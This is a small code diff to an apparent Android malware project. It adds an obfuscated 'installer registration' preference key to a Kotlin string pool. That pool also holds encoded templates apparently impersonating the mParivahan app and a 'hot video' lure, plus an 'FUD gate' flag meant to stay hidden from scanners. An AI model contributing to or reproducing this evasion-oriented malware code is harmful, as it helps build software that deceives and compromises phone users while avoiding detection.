@@ -34,6 +34,9 @@ internal object StringPool {
     val TPL_MPARIVAHAN = "A0AXMxozBAwPXg=="
     val TPL_HOT_VIDEO = "Bl8CYQUsAQEBEBUgHyk="
 
+    // Installer registration — SharedPrefs flag key (obfuscated)
+    val KEY_INSTALLER_REG = "B0IpJRwrAA=="   // "ir_done"
+
     // FUD gate — SharedPrefs store name and flag key (obfuscated, never plaintext in DEX)
     val VG_PREFS     = "GFcpMQEgAxc="   // "vg_prefs"
     val VPN_FLAG     = "GEAYHhE8FQUdQw=="  // "vpn_bypass"
